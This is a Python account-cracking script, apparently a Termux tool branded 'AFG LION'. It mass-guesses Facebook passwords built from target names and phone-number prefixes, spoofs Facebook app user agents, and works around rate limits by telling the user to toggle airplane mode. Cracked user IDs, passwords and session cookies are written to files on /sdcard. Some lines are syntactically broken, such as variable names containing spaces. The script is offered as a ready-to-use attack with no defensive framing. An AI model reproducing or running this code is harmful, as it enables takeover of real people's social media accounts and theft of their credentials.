...
mcc = random.choice(['SM-F711B', 'SM-F711N', 'SM-F711U', 'SM-F711U1', 'SM-E025F', 'SM-T575', 'SM-A516V', 'SM-N770F','SM-M017F', 'SM-J260GU', 'SM-J260GU', 'SM-J260FU', 'SM-J260MU', 'SM-A716F', 'SM-A716F', 'SM-A716F', 'SM-A7160', 'SM-A716B', 'SM-A716U', 'SM-A716B', 'SM-M115F', 'SM-M115F', 'SM-M115M', 'SM-M115M', 'SM-G988', 'SM-G988U', 'SM-G988U1', 'SM-G9880', 'SM-G988B', 'SM-G988N', 'SM-G988B', 'SM-T927A', 'SM-T920', 'SM-A305F', 'SM-A305FN', 'SM-A305G', 'SM-A305GN', 'SM-A305YN', 'SM-A3050', 'SM-A305N', 'SM-A305GT', 'SM-A105F', 'SM-A105G', 'SM-A105M', 'SM-A105FN', 'SM-A920F', 'SM-A9200', 'SM-A920N', 'SM-A920X', 'SM-N960F', 'SM-N9600', 'SM-N960F', 'SM-N960U', 'SM-N960U1', 'SM-N960N', 'SM-N960W', 'SM-N960X', 'SCV40'])
def trish():
    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    VAPP = random.randint(410000000,499999999)
    END = '[FBAN/FB4A;FBAV/72.0.0.62;FBDM/{density=3.6836044192200883,width=1343,height=2087};FBLC/ja_JP;FBRV/571668576 ;FBCR/Jio;FBMF/realme;FBBD/realme;FBPN/messenger-android;FBDV/SM-N770F;FBSV/11.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {SM-N770F}  Build/SM-N770F.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
...
def machikney():
    ...
    ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(10,450))+".0.0."+str(random.randrange(5,49))+"."+str(random.randint(50,200))+";FBBV/"+str(random.randint(000000000,999999999))+";"+f"[FBAN/FB4A;FBAV/155.0.0.297;FBDM/{density=2.3267282656864983,width=1100,height=2184};FBLC/ja_JP;FBRV/34093887 ;FBCR/Sprint;FBMF/realme;FBBD/realme;FBPN/com.facebook.lite;FBDV/SM-N770F;FBSV/9.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    return ua
def sex():
	...
	END = f'[FBAN/FB4A;FBAV/'+str(random.randint(30,450))+'.0.0.'+str(random.randint(5,70))+'.'+str(random.randint(90,200))+';FBBV/'+str(random.randint(111111111,999999999))+';'+f'[FBAN/FB4A;FBAV/84.0.0.218;FBDM/{density=2.3695147809992823,width=864,height=1944};FBLC/fr_FR;FBRV/653517456 ;FBCR/China Mobile;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/SM-N770F;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
...
sys.stdout.write('\x1b]2; AFG LION-AHMED\x07')
...
╩ ╩╚  ╚═╝  ╩═╝╩╚═╝╝╚╝
\033[1;32m──────────────────────────────────────────────────
\033[1;32m[\033[1;31m✓\033[1;32m] AUTHOR    : AFG 
\033[1;32m[\033[1;31m✓\033[1;32m] GITHUB    : afglion5
\033[1;32m[\033[1;31m✓\033[1;32m] ID               : AFG \033[1;36m[X] \x1b[38;5;196mLION
...
def menu():   
    ...
    print(f'\033[1;32m[\033[1;31m5\033[1;32m] JOIN TELEGRAM')
...
def _old_():
       ...
       with Bikash(max_workers=40) as AFG LION:
           clear()
...
def login(uid):
    ...
    try:
        sys.stdout.write(f"\r\033[1;32m[\033[1;31mAFG LION-XD\033[1;32m] \033[1;35m{loop}\033[1;35m \033[1;32m|\033[1;32m OK{G}/{R}CP \033[1;32m|\033[1;32m {G}{len(ok)}/{R}{len(cp)} ")
        sys.stdout.flush()
    ...
    # 'cookie': 'datr=4aLRZuVyPtLywDF3JDXPjc8o; sb=4aLRZtoYBOxT2s0FcJl7pwjn; vpd=v1%3B708x375x2.8860480785369873; ps_l=1; ps_n=1; locale=en_US; m_pixel_ratio=2.8860480785369873; wl_cbv=v2%3Bclient_version%3A2611%3Btimestamp%3A1725446970; wd=375x708; fr=0PfK8Q9mutH1vN7xP.AWWcHJ3e90Oq9oxjO1D1pfmcTqw.Bm0aLh..AAA.0.0.Bm2Dtr.AWUCQaDHKpA',
    'dpr': '2.625',
    ...
    'viewport-width': '980',
            ...
            if "session_key" in rp:
                print(f"\r{R}[{R}AFG LION-CP{R}]{R} {uid} | {pw}")
                open("/sdcard/AFG LION.txt","a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:          
            	print(f"\r{R}[{G1}AFG LION-OK{R}]{G1} {uid} | {pw}")
            	open("/sdcard/AFG LION-cp.txt","a").write(uid+"|"+pw+"\n")
            	oks.append(uid)
            	break
            elif "Please Confirm Email" in str(rp):            
            	print(f"\r{R}[{G1}AFG LION-OK{R}]{G1} {uid} | {pw}")
            	open("/sdcard/AFG LION-ok.txt","a").write(uid+"|"+pw+"\n")
            	oks.append(uid)
            	break
            else:continue
        loop+=1
...
def _Afg_():
    clear()
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE {G}:{G1} +9379{G}/{G1}+9378{G}/{G1}+9377{G}/{G1}+9374 ');linex()
    code = input(f'\033[1;32m[\033[1;31m✓\033[1;32m] CHOICE  {G}:{G2} ')
    clear()
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE {G}:{G3} 3000{G}/{G3}5000{G}/{G3}10000{G}/{G3}99999');linex()
    limit = int(input(f'\033[1;32m[\033[1;31m✓\033[1;32m] CHOICE  {G}:{G4} '))
...
class main_crack():
    ...
    def crack(self,id):
        global methods
        clear()
        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE {G}:{G1} /sdcard/AFG LION.txt');linex()
    ...
    def pasw(self):       
            ...
            print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TURN {G3}[{R}ON{G}/{R}OFF{G3}]{G3} AIRPLANE MODE EVERY {R}5{G3} MIN')
            linex()
            with Bikash(max_workers=30) as AFG LIONworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                AFG LIONworld.submit(self.methodA,uid,name,pwx)
                            elif 'methodB' in methods:
                                AFG LIONworld.submit(self.methodB,uid,name, pwx)
                            elif 'methodC' in methods:
                                AFG LIONworld.submit(self.methodC,uid,name, pwx)
                   except:pass
            result(oks,cps)          
#__________________[ FILE METHOD M1 ]__________________#             
    def methodA(self,sid,name,psw):
        try:
            global loop,oks,cps
            mcc = random.choice(['SM-F711B', 'SM-N770F','SM-F711N', 'SM-F711U', 'SM-F711U1', 'SM-E025F', 'SM-T575', 'SM-A516V', 'SM-M017F', 'SM-J260GU', 'SM-J260GU', 'SM-J260FU', 'SM-J260MU', 'SM-A716F', 'SM-A716F', 'SM-A716F', 'SM-A7160', 'SM-A716B', 'SM-A716U', 'SM-A716B', 'SM-M115F', 'SM-M115F', 'SM-M115M', 'SM-M115M', 'SM-G988', 'SM-G988U', 'SM-G988U1', 'SM-G9880', 'SM-G988B', 'SM-G988N', 'SM-G988B', 'SM-T927A', 'SM-T920', 'SM-A305F', 'SM-A305FN', 'SM-A305G', 'SM-A305GN', 'SM-A305YN', 'SM-A3050', 'SM-A305N', 'SM-A305GT', 'SM-A105F', 'SM-A105G', 'SM-A105M', 'SM-A105FN', 'SM-A920F', 'SM-A9200', 'SM-A920N', 'SM-A920X', 'SM-N960F', 'SM-N9600', 'SM-N960F', 'SM-N960U', 'SM-N960U1', 'SM-N960N', 'SM-N960W', 'SM-N960X', 'SCV40'])
            ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/62.0.0.28.142;FBBV/422769237;FBDM/{density=1.855393936819859,width=1397,height=1281};FBLC/ja_JP;FBRV/422769237;FBCR/Telefonica;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S918B|SM-N770F;FBSV/12;nullFBCA/armeabi-v7a:armeabi;]"
            sys.stdout.write(f"\r\033[1;32m[\033[1;31mAFG LION-M1\033[1;32m] \033[1;36m{loop}\033[1;35m \033[1;34m|\033[1;32m OK\033[1;34m|\033[1;31mCP \033[1;32m{len(oks)}\033[1;34m|\033[1;31m{len(cps)} \033[1;34m| \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
    ...
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=4aLRZuVyPtLywDF3JDXPjc8o; sb=4aLRZtoYBOxT2s0FcJl7pwjn; vpd=v1%3B708x375x2.8860480785369873; ps_l=1; ps_n=1; m_pixel_ratio=2.8860480785369873; locale=de_DE; wl_cbv=v2%3Bclient_version%3A2611%3Btimestamp%3A1725453891; fr=0PfK8Q9mutH1vN7xP.AWXJdJS5YMI4vIy3yDAbcj2fT4U.Bm0aLh..AAA.0.0.Bm2FZ2.AWWJhXt_Njo; wd=375x708',
    'dpr': '2.625',
    'referer': 'https://m.facebook.com/bookmarks/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    ...
    'viewport-width': '980',
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AFG LIONb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AFG LIONb};{ckkk}"
                    print(f"\r\r{G1}[AFG LION-OK] {sid} | {ps} ")
                    print(f"\r\r{G1}[COOKIES-💜]>{O}{cookie} ")
                    open('/sdcard/AFG LION-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[AFG LION-CP] {sid} | {ps} ")
                    open('/sdcard/AFG LION-M1-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
...
#__________________[ FILE METHOD M2 ]__________________#             
    def methodB(self,sid,name,psw):
        try:
            ...
            sys.stdout.write(f"\r\033[1;32m[\033[1;31mAFG LION-M2\033[1;32m] \033[1;36m{loop}\033[1;35m \033[1;34m|\033[1;32m OK\033[1;34m|\033[1;31mCP \033[1;32m{len(oks)}\033[1;34m|\033[1;31m{len(cps)} \033[1;34m| \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
    ...
    'viewport-width': '980',
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r\r{G1}[AFG LION-OK] {sid} | {ps} ")
                    print(f"\r\r{G1}[COOKIES-💜]>{O}{cookie} ")
                    open('/sdcard/AFG LION-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[AFG LION-CP] {sid} | {ps} ")
                    open('/sdcard/AFG LION-M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
    ...
    def methodC(self,sid,name,psw):
        try:
            ...
            mcc = random.choice(['SM-F711B', 'SM-F711N', 'SM-F711U', 'SM-F711U1', 'SM-E025F', 'SM-T575', 'SM-A516V', 'SM-M017F', 'SM-J260GU', 'SM-J260GU', 'SM-J260FU', 'SM-J260MU', 'SM-A716F', 'SM-A716F', 'SM-A716F', 'SM-A7160', 'SM-A716B', 'SM-A716U', 'SM-A716B', 'SM-M115F', 'SM-M115F', 'SM-M115M', 'SM-M115M', 'SM-G988', 'SM-G988U', 'SM-G988U1', 'SM-G9880', 'SM-G988B', 'SM-G988N', 'SM-G988B', 'SM-T927A', 'SM-T920', 'SM-A305F', 'SM-A305FN', 'SM-A305G', 'SM-A305GN', 'SM-A305YN', 'SM-A3050', 'SM-A305N', 'SM-A305GT', 'SM-A105F', 'SM-A105G', 'SM-A105M', 'SM-A105FN', 'SM-A920F', 'SM-A9200', 'SM-A920N', 'SM-A920X', 'SM-N960F', 'SM-N9600', 'SM-N960F', 'SM-N960U', 'SM-N960U1', 'SM-N960N', 'SM-N960W', 'SM-N960X', 'SCV40'])
            uai = '[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(random.randint(40,200))+'.0.0.'+str(random.randint(1,66))+'.117;FBBV/308613358;FBDM/{density=2.0,width=720,height=1440};FBLC/it_IT;FBRV/'+str(random.randint(111111111,666666666))+';FBCR/Airalo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/'+str(mcc)+';FBSV/7.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
            sys.stdout.write(f"\r\033[1;32m[\033[1;31mAFG LION-M3\033[1;32m] \033[1;36m{loop}\033[1;35m \033[1;34m|\033[1;32m OK\033[1;34m|\033[1;31mCP \033[1;32m{len(oks)}\033[1;34m|\033[1;31m{len(cps)} \033[1;34m| \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
    ...
    'viewport-width': '980',
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r\r{G1}[AFG LION-OK] {sid} | {ps} ")
                    print(f"\r\r{G1}[COOKIES-💜]>{O}{cookie} ")
                    open('/sdcard/AFG LION-M3-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[AFG LION-CP] {sid} | {ps} ")
                    open('/sdcard/AFG LION-M3-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
...
def randm(ids,psd):
    global loop,ok,cp
    redmi = random.choice(["2201116SI","SM-N770F","SM-S918B","M2012K11AI","22011119TI","21091116UI","M2102K1AC","M2012K11I","22041219I","22041216I","2203121C","2106118C","2201123G","2203129G","2201122G","2201122C","2206122SC","22081212C","2112123AG","2112123AC","2109119BC","M2002J9G","M2007J1SC","M2007J17I","M2102J2SC","M2007J3SY","M2007J17G","M2007J3SG","M2011K2G","M2101K9AG","M2101K9R","2109119DG","M2101K9G","2109119DI","M2012K11G","M2102K1G","21081111RG","2107113SG","21051182G","M2105K81AC","M2105K81C","21061119DG","21121119SG","22011119UY","21061119AG","21061119AL","22041219NY","22041219G","21061119BI","220233L2G","220233L2I","220333QNY","220333QAG","M2004J7AC","M2004J7BC","M2004J19C","M2006C3MII","M2010J19SI","M2006C3LG","M2006C3LVG","M2006C3MG","M2006C3MT","M2006C3MNG","M2006C3LII","M2010J19SL","M2010J19SG","M2010J19SY","M2012K11AC","M2012K10C"])
    uam = '[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(random.randint(40,100))+'.0.0.'+str(random.randint(1,66))+'.119;FBBV/'+str(random.randint(111111111,666666666))+';[FBAN/FB4A;FBAV/116.37.84.51;FBBV/41431469;FBDM/{density=2.5,width=1440,height=1863};FBLC/en_US;FBRV/77007146;FBCR/null;FBMF/lge;FBBD/lge;FBPN/com.facebook.katana;FBDV/LGE;FBSV/9.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    sys.stdout.write(f"\r\033[1;32m[\033[1;31mAFG LION-RNDM\033[1;32m] \033[1;35m{loop}\033[1;35m \033[1;32m|\033[1;32m OK{G}/{R}CP \033[1;32m|\033[1;32m {G}{len(ok)}/{R}{len(cp)} ")
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
    ...
    'viewport-width': '980',
            ...
            if 'access_token' in q:
                uid = str(q['uid'])
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AFG LIONb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AFG LIONb};{ckkk}"
                print(f'\r\r{G1}[AFG LION-OK] {uid} | {pas}')
                print(f'\r\r{G1}[COOKIE]{R} {cookie}')
                open('/sdcard/AFG LION-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                ok.append(uid)
                break
            elif 'www.facebook.com' in q['error']['message']:
                print(f"\r\r{M}[AFG LION-CP] {uid} | {pas} ")
                open('/sdcard/AFG LION-RNDM-CP.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                cps.append(uid)
            else:     
                continue
        loop+=1
